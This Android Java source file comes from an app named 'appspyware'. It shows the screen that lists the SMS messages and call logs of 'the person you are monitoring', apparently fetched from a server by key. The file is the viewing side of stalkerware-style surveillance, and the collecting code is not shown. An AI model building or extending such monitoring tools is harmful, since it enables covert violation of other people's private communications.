package com.example.tienbi.appspyware.activity;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.os.Bundle;
import android.widget.ListView;
import android.widget.TextView;

import com.example.tienbi.appspyware.adapter.CallAdapter;
import com.example.tienbi.appspyware.adapter.SmsAdapter;
import com.example.tienbi.appspyware.App;
import com.example.tienbi.appspyware.asystask.CallTask;
import com.example.tienbi.appspyware.asystask.SmsTask;
import com.example.tienbi.appspyware.mode.CallInfo;
import com.example.tienbi.appspyware.mode.SMSInfo;
import com.example.tienbi.appspyware.R;

import java.util.ArrayList;

/**
 * Created by TienBi on 16/09/2016.
 */
public class ResultActivity extends Activity{
    private TextView txtTitle;
    private ListView lvResult;
    private ProgressDialog progressDialog;

    private SmsAdapter smsAdapter;
    private ArrayList<SMSInfo> arrSms;

    private CallAdapter callAdapter;
    private ArrayList<CallInfo> arrCall;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.result_layout);

        addControls();
        loadResult();
    }

    private void addControls() {
        txtTitle=(TextView)findViewById(R.id.txtTitle);
        lvResult=(ListView)findViewById(R.id.lvResult);

        arrSms=new ArrayList<>();
        smsAdapter=new SmsAdapter(this,R.layout.item_sms_layout,arrSms);
        lvResult.setAdapter(smsAdapter);

        progressDialog = new ProgressDialog(this);
        progressDialog.setTitle("Thông báo");
        progressDialog.setMessage("Vui lòng chờ");
        progressDialog.setCanceledOnTouchOutside(false);
    }
    private void loadResult(){
        Intent intent =getIntent();
        int x=intent.getIntExtra("x",-1);
        switch (x){
            case SelectionActivity.SMS:
                loadSMS();
                break;
            case SelectionActivity.CALL:
                loadCALL();
                break;
        }
    }
    private void loadSMS(){
        arrSms=new ArrayList<>();
        smsAdapter=new SmsAdapter(this,R.layout.item_sms_layout,arrSms);
        lvResult.setAdapter(smsAdapter);
        txtTitle.setText("Tin nhắn của người bạn theo dõi");
        SmsTask smsTask =new SmsTask(progressDialog,smsAdapter);
        smsTask.execute(App.getKey());
    }
    private void loadCALL(){
        arrCall=new ArrayList<>();
        callAdapter=new CallAdapter(this,R.layout.item_call_layout,arrCall);
        lvResult.setAdapter(callAdapter);
        txtTitle.setText("Nhật ký cuộc gọi của người bạn theo dõi");
        CallTask callTask =new CallTask(progressDialog,callAdapter);
        callTask.execute(App.getKey());
    }
}
